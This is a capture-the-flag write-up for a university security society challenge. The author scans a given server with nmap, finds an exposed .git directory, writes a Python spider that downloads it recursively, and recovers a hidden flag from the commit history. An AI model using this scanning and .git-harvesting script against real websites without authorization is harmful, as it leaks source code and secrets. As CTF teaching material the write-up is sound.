+++
title = "CSEC CTF: Missing"
date = 2020-04-12T01:26:00+10:00
lastmod = 2020-07-08T01:26:00+10:00
tags = [
	"csec"
	]
categories = [
	"CTF"
]
imgs = []
cover = ""  # image show on top
readingTime = true  # show reading time after article date
toc = true
comments = true
justify = false  # text-align: justify;
single = false  # display as a single page, hide navigation on bottom, like as about page.
license = ""  # CC License
draft = false
+++

# Challenge Info

This is a challenge from the UTS Cyber Security Society (CSEC) Semester-long CTF for 2020 Autumn session.

Link: [here](https://ctf.utscyber.org/challenges#Missing)

![Challenge Missing](/img/chell-missing.png)

# Poking around

So the description gave us a URL ([http://128.199.239.130:8007](http://128.199.239.130:8007)). No reason not to start here, right? And we got:


![Just Apache](/img/just-apache.png)

Hmmm... Seems a newly set up Apache server, running a Ubuntu machine, without even serving a proper page. Not quite informative. Nothing in the page source, either :(


Next thing came up to me was scanning the port: 

```bash
nmap -sC -sV -p8007 128.199.239.130
```
![nmap](/img/nmap8007.png)

Here! We found something interesting: a git repository! Let's try pull this repository down.

# Pull the `.git/` directory down

Let's try `git clone` this repository:

![Git clone fails](/img/git-clone-fails.png)

Uh oh. Seems it doesn't work the normal way. But it should do no harm if we check the [URL](http://128.199.239.130:8007/.git) with our browser.

![.git directory](/img/8007.git.png)

Looking good. The directory is served in its raw structure. This means we can spider everything down in the worst case. So why not make a spider now ;)

Here it goes:

```python spider.py
import requests
from bs4 import BeautifulSoup
import os

baseurl = "http://128.199.239.130:8007/.git"

def scan(rel):
	print("scanning " + rel)
	if rel.startswith('/'):
		directory = '.' + rel

	if not os.path.exists(directory):
		print(directory + " does not exist, creating")
		os.mkdir(directory)

	url = baseurl + rel
	print("sending get request: " + url)
	soup = BeautifulSoup(requests.get(url).text)
	for td in soup.find_all('td'):
		for a in td.find_all('a'):
			href = a.get('href')
			print("href: " + href)
			if href.endswith('/'):
				if a.contents[0] != 'Parent Directory':
					scan(rel + href)
			else:
				open(directory + href, 'wb').write(requests.get(baseurl + rel + href).content)

scan('/')
```

Let's save it as `spider.py` in a appropriate (empty) directory, because it downloads everything to the $PWD, which may create a mess. Now let's run this code!

```bash
$ ls
spider.py
$ python3 spider.py 
scanning /
sending get request: http://128.199.239.130:8007/.git/
href: /
href: COMMIT_EDITMSG
href: HEAD
href: Icon
href: ORIG_HEAD
href: config
href: description
(.....)
(script logs blah blah)
(.....)

$ ls
COMMIT_EDITMSG  description  hooks  index  logs     ORIG_HEAD  spider.py
config          HEAD         Icon   info   objects  refs
```


Hooray! Now we got the repository. My zsh even told me we are on `master` branch.

# Working git

First of all, let's see the commit history of course.

![Git log](/img/gitlog.png)

The third commit says 'hide flag'. If it is THE FLAG we are looking for (apprently), then we should check what it has hidden. Let's go checkout the Initial Commit.

![Checkout fatal](/img/checkout-fatal.png)

Hmmm... Didn't go well. But what does this error message mean? 

Luckily, Google has always been my friend, and I found [this question](https://stackoverflow.com/questions/9262801/fatal-this-operation-must-be-run-in-a-work-tree), and the comments on the answer proved very helpful.

Turns out the `.git/` directory is a hidden directory which `git` creates when you initialize your repository, and where all the commit snapshots are saved. That is, you can restore any file of any version with this directory. But the files you normally work with should be the parent directory of `.git/`.

Then this would be easy. Let what belongs to `.git/` go to `.git/`, and make our 'missing' directory its parent.

![Move .git](/img/move-git.png)

Now everything is normal and familiar again. Let's finish what was to be done.

![Flag retrieved](/img/flag-retrieved.png)
